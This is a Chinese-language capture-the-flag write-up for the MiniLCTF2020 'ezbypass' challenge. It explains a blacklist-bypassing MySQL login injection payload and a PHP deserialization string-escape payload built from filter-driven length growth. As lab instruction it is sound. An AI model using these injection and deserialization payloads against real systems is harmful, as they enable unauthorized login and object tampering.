# MiniLCTF2020 - ezbypass

## 题目简述

题目分为两关：第一关是过滤 `or`、`and`、`=`、`,` 等字符的 MySQL 登录注入；第二关把 `php`、`flag`、`xdsec` 替换为 `hack!!!!` 后再反序列化，形成字符串长度膨胀导致的对象属性逃逸。官方仓库没有保留该题服务源码，本篇以多份参赛记录中一致的请求、过滤函数和回显为证据，不补造缺失字段。

## 解题过程

登录查询可用 `||` 代替 `OR`，用 `LIMIT ... OFFSET ...` 避免逗号。参赛时可用的请求为：

```http
logname=1"||1 limit 1 offset 3#&logpass=1
```

它选中第四行，并在弹窗中泄露下一关路径：

```text
Username: Flag_1s_heRe
Password: goto /flag327a6c4304a
```

预期路线还可以从 `mysql.innodb_table_stats` 找表名，再做无列名注入；上面的 `OFFSET` 属于更短的非预期解。

第二关的关键过滤逻辑为：

```php
$key = array('php', 'flag', 'xdsec');
$filter = '/'.implode('|', $key).'/i';
return preg_replace($filter, 'hack!!!!', $payload);
```

每个 `php` 从 3 字节扩成 8 字节，即每次多出 5 字节。反序列化仍按过滤前串中声明的 `s:<长度>` 截取，于是膨胀后的尾部可以越出原属性并被解释成新的序列化字段。参赛记录使用的逃逸尾部是：

```text
phpphpphpphpphpphpphp";s:3:"V0n";s:14:"has_girlfriend";}
```

把它放入对应可控属性后，膨胀量恰好将 `";s:3:"V0n";...` 推到对象结构边界，覆盖目标属性并进入成功分支。原 WP 曾把 `hack!!!!` 误写成“5 个字符”；实际是 8 个字符，计算逃逸长度时必须按 `8 - 3 = 5` 的增量处理。

## 方法总结

黑名单 SQL 注入要检查同义运算符、分页语法和系统统计表。PHP 字符串逃逸题则应列出“过滤前长度、每次替换增量、触发次数、目标结构偏移”四项再构造载荷；少算一个字节就会让后续字段无法被反序列化。
